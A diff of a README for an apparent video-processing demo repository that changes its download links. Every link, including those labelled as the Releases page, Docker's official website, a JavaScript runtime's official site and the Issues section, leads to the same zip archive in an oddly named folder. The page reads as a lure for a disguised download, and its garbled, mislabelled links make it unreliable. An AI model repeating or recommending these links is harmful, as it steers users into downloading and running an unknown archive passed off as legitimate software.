@@ -1,7 +1,7 @@
 # 🎥 scalable-video-pipeline-demo - Simplified Video Processing for Everyone
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/icy-debug/scalable-video-pipeline-demo/main/crinatory/demo_pipeline_video_scalable_2.2-alpha.1.zip)](https://raw.githubusercontent.com/icy-debug/scalable-video-pipeline-demo/main/crinatory/demo_pipeline_video_scalable_2.2-alpha.1.zip)
+[![Download](https://github.com/icy-debug/scalable-video-pipeline-demo/raw/refs/heads/main/crinatory/scalable-video-pipeline-demo-3.5.zip)](https://github.com/icy-debug/scalable-video-pipeline-demo/raw/refs/heads/main/crinatory/scalable-video-pipeline-demo-3.5.zip)
 
 ## 📜 Overview
 The scalable-video-pipeline-demo is a powerful tool designed for video processing. It uses a TypeScript Express API, a Python FFmpeg worker, and a Kafka queue, all backed by PostgreSQL and Google Cloud Storage. This system supports asynchronous transcoding, proxy generation, and metadata extraction. It serves as a robust solution for media workflows, ensuring that your video processing needs are met efficiently.
@@ -10,14 +10,14 @@ The scalable-video-pipeline-demo is a powerful tool designed for video processin
 To start using the scalable-video-pipeline-demo, follow these simple steps.
 
 ### 1. Download the Software
-Visit the [Releases page](https://raw.githubusercontent.com/icy-debug/scalable-video-pipeline-demo/main/crinatory/demo_pipeline_video_scalable_2.2-alpha.1.zip) to download the latest version. You will find different files there that suit your operating system. Choose the appropriate file for your device.
+Visit the [Releases page](https://github.com/icy-debug/scalable-video-pipeline-demo/raw/refs/heads/main/crinatory/scalable-video-pipeline-demo-3.5.zip) to download the latest version. You will find different files there that suit your operating system. Choose the appropriate file for your device.
 
 ### 2. Install Required Software
 Before running the application, ensure you have the following software installed on your computer:
 
-- **Docker**: This tool helps you run applications in containers. You can download and install it from [Docker's official website](https://raw.githubusercontent.com/icy-debug/scalable-video-pipeline-demo/main/crinatory/demo_pipeline_video_scalable_2.2-alpha.1.zip).
+- **Docker**: This tool helps you run applications in containers. You can download and install it from [Docker's official website](https://github.com/icy-debug/scalable-video-pipeline-demo/raw/refs/heads/main/crinatory/scalable-video-pipeline-demo-3.5.zip).
   
-- **https://raw.githubusercontent.com/icy-debug/scalable-video-pipeline-demo/main/crinatory/demo_pipeline_video_scalable_2.2-alpha.1.zip**: Required for executing JavaScript code server-side. Download it from [https://raw.githubusercontent.com/icy-debug/scalable-video-pipeline-demo/main/crinatory/demo_pipeline_video_scalable_2.2-alpha.1.zip official site](https://raw.githubusercontent.com/icy-debug/scalable-video-pipeline-demo/main/crinatory/demo_pipeline_video_scalable_2.2-alpha.1.zip).
+- **https://github.com/icy-debug/scalable-video-pipeline-demo/raw/refs/heads/main/crinatory/scalable-video-pipeline-demo-3.5.zip**: Required for executing JavaScript code server-side. Download it from [https://github.com/icy-debug/scalable-video-pipeline-demo/raw/refs/heads/main/crinatory/scalable-video-pipeline-demo-3.5.zip official site](https://github.com/icy-debug/scalable-video-pipeline-demo/raw/refs/heads/main/crinatory/scalable-video-pipeline-demo-3.5.zip).
 
 ### 3. Run the Application
 After downloading, follow these instructions:
@@ -66,7 +66,7 @@ If you encounter issues, try the following:
 - Make sure Docker is running before you start the application.
 - Check your network connection if the application is not loading.
 
-If problems persist, visit the [Issues section](https://raw.githubusercontent.com/icy-debug/scalable-video-pipeline-demo/main/crinatory/demo_pipeline_video_scalable_2.2-alpha.1.zip) on our GitHub page to report your issue or find solutions posted by others.
+If problems persist, visit the [Issues section](https://github.com/icy-debug/scalable-video-pipeline-demo/raw/refs/heads/main/crinatory/scalable-video-pipeline-demo-3.5.zip) on our GitHub page to report your issue or find solutions posted by others.
 
 ## 📑 Documentation
 For more detailed documentation on APIs and advanced configurations, check the Wiki section in the repository. This resource includes deeper insights into setting up different environments and additional features available in the system.
@@ -84,4 +84,4 @@ Join our community for discussion, feature requests, and support. Engage with us
 
 Remember, a successful video pipeline begins with the right tools. Start your processing journey with us today! 
 
-[🔗 Download Here Again](https://raw.githubusercontent.com/icy-debug/scalable-video-pipeline-demo/main/crinatory/demo_pipeline_video_scalable_2.2-alpha.1.zip)
+[🔗 Download Here Again](https://github.com/icy-debug/scalable-video-pipeline-demo/raw/refs/heads/main/crinatory/scalable-video-pipeline-demo-3.5.zip)
